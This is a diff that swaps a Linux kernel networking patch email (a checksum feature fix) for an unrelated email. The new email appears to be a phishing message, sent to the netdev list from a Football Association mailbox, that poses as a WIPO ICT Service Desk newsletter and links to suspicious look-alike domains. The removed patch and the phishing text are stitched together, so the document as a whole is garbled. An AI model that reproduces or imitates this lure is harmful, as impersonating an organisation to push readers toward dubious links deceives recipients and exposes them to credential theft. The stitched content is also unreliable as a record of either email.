@@ -1,50 +1,394 @@
-From: Vladislav Yasevich <vyasevich@gmail.com>
-Subject: [PATCH net] netdevice: Prefer NETIF_F_HW_CSUM when intersecting features
-Date: Wed, 19 Apr 2017 21:12:23 -0400
-Message-ID: <1492650743-28164-1-git-send-email-vyasevic@redhat.com>
-Cc: tom@herbertland.com, mkubecek@suse.cz,
-        Vladislav Yasevich <vyasevic@redhat.com>
-To: netdev@vger.kernel.org
+From: Gary Knight <Gary.Knight@thefa.com>
+Subject: RE: IT Newsletter
+Date: Thu, 20 Apr 2017 01:01:09 +0000
+Message-ID: <E3A03F19D611AA4F99051CC9E30A8994025B6E0178@FBA01MBX02.fa.ds.com>
+References: <E3A03F19D611AA4F99051CC9E30A8994025B6D90E2@FBA01MBX02.fa.ds.com>
+Mime-Version: 1.0
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: 8BIT
+To: Gary Knight <Gary.Knight@thefa.com>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-qt0-f194.google.com ([209.85.216.194]:36357 "EHLO
-        mail-qt0-f194.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1763356AbdDTBMe (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Wed, 19 Apr 2017 21:12:34 -0400
-Received: by mail-qt0-f194.google.com with SMTP id t52so5597164qtb.3
-        for <netdev@vger.kernel.org>; Wed, 19 Apr 2017 18:12:34 -0700 (PDT)
+Received: from mars.the-fa.org ([194.0.214.68]:8382 "EHLO mars.the-fa.org"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S1763838AbdDTBQ3 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Wed, 19 Apr 2017 21:16:29 -0400
+In-Reply-To: <E3A03F19D611AA4F99051CC9E30A8994025B6D90E2@FBA01MBX02.fa.ds.com>
+Content-Language: en-GB
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-While hardware device use either NETIF_F_(IP|IPV6)_CSUM or
-NETIF_F_HW_CSUM, all of the software devices use HW_CSUM.
-This results in an interesting situation when the software
-device is configured on top of hw device using (IP|IPV6)_CSUM.
-In this situation, the user can't turn off checksum offloading
-features on the software device.
 
-This patch resolves that by prefering the NETIF_F_HW_CSUM setting
-when computing a feature intersect.
 
-Signed-off-by: Vladislav Yasevich <vyasevic@redhat.com>
----
- include/linux/netdevice.h | 4 ++--
- 1 file changed, 2 insertions(+), 2 deletions(-)
+________________________________
+From: Gary Knight
+Sent: 20 April 2017 01:10
+Subject: IT Newsletter
 
-diff --git a/include/linux/netdevice.h b/include/linux/netdevice.h
-index 97456b25..3d811c1 100644
---- a/include/linux/netdevice.h
-+++ b/include/linux/netdevice.h
-@@ -4019,9 +4019,9 @@ static inline netdev_features_t netdev_intersect_features(netdev_features_t f1,
- {
- 	if ((f1 ^ f2) & NETIF_F_HW_CSUM) {
- 		if (f1 & NETIF_F_HW_CSUM)
--			f1 |= (NETIF_F_IP_CSUM|NETIF_F_IPV6_CSUM);
-+			f2 |= NETIF_F_HW_CSUM;
- 		else
--			f2 |= (NETIF_F_IP_CSUM|NETIF_F_IPV6_CSUM);
-+			f1 |= NETIF_F_HW_CSUM;
- 	}
- 
- 	return f1 & f2;
--- 
-2.7.4
+
+Dear colleagues,
+
+
+
+To keep you abreast of ICT developments of the Organization and to keep your technical skills up to date, the latest IT Newsletter issue is now available at   <http://9yu5dzi27.ugo.florist/>
+
+http://www.tjyukilohgchgcj.citymax.com/feedback.html
+
+
+ICT Service Desk | World Intellectual Property Organization
+
+P Please consider the environment before printing this e-mail
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+This communication contains information which is confidential, which may be privileged, and which is for the exclusive use of the intended recipient(s). If you are not an intended recipient please note that any distribution, disclosure, use or copying of any 
+part of this communication is strictly prohibited. If you have received this communication in error please notify us by return email or by telephone on +44(0)800 169 1863 and delete this communication and any copies of it. The FA Group (which for the 
+purpose of this communication means The Football Association Limited and its subsidiary companies including Wembley National Stadium Limited and National Football Centre Limited does not warrant that this email is free from error, viruses, malware, 
+data-damaging material or other defects, or is compatible with your equipment or fit for any purpose. The FA Group may monitor, intercept and block emails addressed to its users or take any other action in accordance with its email use policy. 
+Statements or opinions may be expressed in this communication that are personal to the sender and do not necessarily represent the views of The FA Group or any member of it. Unless expressly stated otherwise, no member of The FA Group shall be 
+bound by any contract or obligation purported to be created by this communication. 
+This communication has originated from the communications system of The FA Group. 
+The Football Association Limited (Company number 77797),  Wembley National Stadium Limited (Company number 3388437) and National Football Centre Limited (Company number 2523346) are all registered in England and Wales, with their registered 
+office at Wembley Stadium, Wembley, London HA9 0WS. For The FA Tel: +44(0)800 169 1863. http://www.thefa.com. For Wembley National Stadium Limited Tel: +44(0)800 169 2007 http://www.wembleystadium.com
